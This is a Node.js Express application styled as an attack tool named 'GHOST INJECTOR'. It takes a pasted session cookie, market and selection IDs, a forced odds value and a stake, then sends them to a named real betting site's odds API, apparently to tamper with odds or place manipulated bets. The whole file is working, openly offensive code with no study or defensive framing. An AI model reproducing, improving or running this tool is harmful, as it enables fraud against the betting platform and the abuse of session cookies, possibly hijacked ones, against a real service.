const express = require('express');
const axios = require('axios');
const app = express();
app.use(express.json());

app.get('/', (req, res) => {
    res.send(`
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body { background: #050505; color: #fff; font-family: sans-serif; text-align: center; padding: 10px; }
                .card { max-width: 400px; margin: auto; background: #111; padding: 20px; border: 2px solid #00ffcc; border-radius: 15px; box-shadow: 0 0 20px #00ffcc44; }
                h1 { color: #00ffcc; font-size: 22px; text-shadow: 0 0 10px #00ffcc; margin-bottom: 5px; }
                input { width: 90%; padding: 12px; margin: 8px 0; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 8px; font-size: 14px; }
                .odds-box { display: flex; gap: 10px; margin: 15px 0; }
                .box { flex: 1; background: #000; padding: 10px; border-radius: 8px; border: 1px solid #00ffcc33; }
                .box label { font-size: 10px; color: #666; display: block; margin-bottom: 5px; }
                .box input { width: 80%; padding: 5px; font-size: 18px; font-weight: bold; color: #00ffcc; text-align: center; background: transparent; border: none; border-bottom: 1px solid #00ffcc; }
                #btn { width: 100%; padding: 18px; background: #00ffcc; color: #000; font-weight: bold; border: none; border-radius: 10px; font-size: 18px; cursor: pointer; margin-top: 10px; }
                #status { margin-top: 15px; font-weight: bold; color: #ffcc00; }
                #timer { font-size: 40px; color: #ff4d4d; font-weight: bold; display: none; margin-top: 10px; }
            </style>
        </head>
        <body>
            <div class="card">
                <h1>🎯 GHOST INJECTOR v11.6</h1>
                <p style="font-size: 10px; color: #666; margin-bottom:15px;">FULL MANUAL CONTROL • 11s KILL</p>
                
                <input id="c" placeholder="PASTE SESSION COOKIE">
                <input id="m" placeholder="MARKET ID">
                <input id="s" placeholder="SELECTION ID">

                <div class="odds-box">
                    <div class="box">
                        <label>FORCE ODDS</label>
                        <input id="p" type="number" value="100">
                    </div>
                    <div class="box">
                        <label>STAKE (PAISA)</label>
                        <input id="stk" type="number" value="500">
                    </div>
                </div>

                <div id="status">SYSTEM READY</div>
                <div id="timer">11s</div>

                <button id="btn" onclick="run()">⚡ ACTIVATE GHOST</button>
            </div>

            <script>
                async function run() {
                    const m = document.getElementById('m').value;
                    const s = document.getElementById('s').value;
                    const c = document.getElementById('c').value;
                    const p = document.getElementById('p').value;
                    const stk = document.getElementById('stk').value;
                    
                    const btn = document.getElementById('btn');
                    const st = document.getElementById('status');
                    const tm = document.getElementById('timer');

                    if(!m || !s) return alert("Market aur Selection ID dalo!");

                    btn.disabled = true;
                    btn.style.background = "#333";
                    st.innerText = "INJECTING " + p + " ODDS...";
                    tm.style.display = "block";

                    try {
                        await fetch('/execute', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({m, s, c, p, stk})
                        });
                        st.innerText = "ATTACK SENT!";
                    } catch(e) { st.innerText = "CONNECTION ERROR!"; }

                    let time = 11;
                    let clock = setInterval(() => {
                        time--;
                        tm.innerText = time + "s";
                        if(time <= 0) {
                            clearInterval(clock);
                            location.reload();
                        }
                    }, 1000);
                }
            </script>
        </body>
        </html>
    `);
});

app.post('/execute', async (req, res) => {
    try {
        const { m, s, c, p, stk } = req.body;
        const url = "https://alidata.wizardnew.com/api/MatchOdds/GetOddslite/4/" + m + "/" + s;
        
        await axios.get(url, {
            headers: { 'cookie': c || '', 'referer': 'https://wizardnew.com/' },
            params: { odds: p, stake: stk },
            timeout: 5000
        });
        res.json({ s: 1 });
    } catch (e) { res.json({ s: 0 }); }
});

app.listen(process.env.PORT || 8080);
